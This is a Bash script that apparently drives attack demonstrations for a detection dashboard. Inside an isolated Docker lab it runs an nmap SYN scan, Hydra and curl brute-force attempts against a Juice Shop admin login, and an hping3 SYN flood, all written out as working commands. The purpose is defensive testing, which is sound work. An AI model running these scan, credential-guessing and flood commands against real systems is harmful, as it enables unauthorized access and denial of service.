#!/bin/bash
# ===============================================================================
# PhantomAgent — Demo Attack Flow Automation Script
# Executes real attacks inside the isolated Kali Linux Docker container
# ===============================================================================

TARGET_IP="172.28.0.5"
KALI_CONTAINER="kali_attacker"

echo "==============================================================================="
echo "              PHANTOMAGENT — LIVE ATTACK DEMONSTRATION SUITE                   "
echo "==============================================================================="
echo "Target IP : ${TARGET_IP} (Juice Shop Container)"
echo "Attacker  : Container '${KALI_CONTAINER}' (IP: 172.28.0.10)"
echo "==============================================================================="

# The lab belongs to ./start.sh, which also stops it on shutdown. Starting containers
# here would leave them running after this script exits.
echo "[PRE-CHECK] Verifying Docker lab containers..."
if ! docker inspect -f '{{.State.Running}}' ${KALI_CONTAINER} 2>/dev/null | grep -q "true"; then
    echo "[ERROR] Docker lab is not running."
    echo "        Start the system first:  ./start.sh"
    exit 1
fi

# Verify Kali can reach target
if ! docker exec ${KALI_CONTAINER} ping -c 1 -W 2 ${TARGET_IP} >/dev/null 2>&1; then
    echo "[ERROR] Kali cannot reach ${TARGET_IP}. Docker lab network may be down."
    echo "        Start the system first:  ./start.sh"
    exit 1
fi
echo "[PRE-CHECK] Network verified: Kali -> ${TARGET_IP} OK"
echo ""

echo "Select Attack Scenario to Execute:"
echo " 1) Reconnaissance   : Nmap Stealth SYN Port Scan (-sS)"
echo " 2) Brute Force      : Hydra HTTP Credential Spraying"
echo " 3) Zero-Day Anomaly : High-Entropy Structural Anomaly Flow"
echo " 4) Full Suite       : Execute all 3 attack scenarios sequentially"
echo "==============================================================================="

read -p "Enter choice [1-4]: " CHOICE

run_recon() {
    echo -e "\n[ATTACK 1/3] Executing Nmap Stealth SYN Scan against ${TARGET_IP}..."
    docker exec ${KALI_CONTAINER} nmap -sS -p 1-100 ${TARGET_IP}
    echo "✔ Nmap scan completed. Watch React Dashboard for PORT_SCAN alert."
}

run_bruteforce() {
    echo -e "\n[ATTACK 2/3] Executing Hydra Credential Spraying against ${TARGET_IP}:3000..."
    # Hydra HTTP brute force on Juice Shop port 3000
    docker exec ${KALI_CONTAINER} hydra \
        -l admin \
        -P /usr/share/wordlists/nmap.lst \
        -s 3000 \
        -t 4 \
        ${TARGET_IP} http-post-form "/#/login:email=^USER^&password=^PASS^:F=Invalid" \
        2>/dev/null || true

    # Fallback: rapid HTTP requests to trigger brute force detection via high packet rate
    echo "[ATTACK 2/3] Sending rapid HTTP authentication attempts to trigger detection..."
    docker exec ${KALI_CONTAINER} bash -c "for i in \$(seq 1 30); do curl -s -o /dev/null -w '' http://${TARGET_IP}:3000/rest/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"wrongpassword\"}' 2>/dev/null; done"
    echo "✔ Brute force completed. Watch React Dashboard for BRUTE_FORCE alert."
}

run_zeroday() {
    echo -e "\n[ATTACK 3/3] Executing Un-labeled Zero-Day Structural Anomaly against ${TARGET_IP}..."
    # hping3 flood: send a 2-second high-frequency TCP SYN burst on port 3000 with timeout so it doesn't hang
    docker exec ${KALI_CONTAINER} bash -c "timeout 2s hping3 -S --flood -p 3000 ${TARGET_IP} 2>/dev/null || true"
    docker exec ${KALI_CONTAINER} bash -c "for i in \$(seq 1 40); do curl -s -o /dev/null -m 0.2 http://${TARGET_IP}:3000/ 2>/dev/null; done"
    echo "✔ Zero-day anomaly burst completed. Watch React Dashboard for UNKNOWN_ZERO_DAY alert (GNN Score > 0.75)."
}

case $CHOICE in
    1)
        run_recon
        ;;
    2)
        run_bruteforce
        ;;
    3)
        run_zeroday
        ;;
    4)
        run_recon
        sleep 8
        run_bruteforce
        sleep 8
        run_zeroday
        ;;
    *)
        echo "Invalid option."
        exit 1
        ;;
esac

echo -e "\n==============================================================================="
echo "Demo attack execution finished."
echo "==============================================================================="
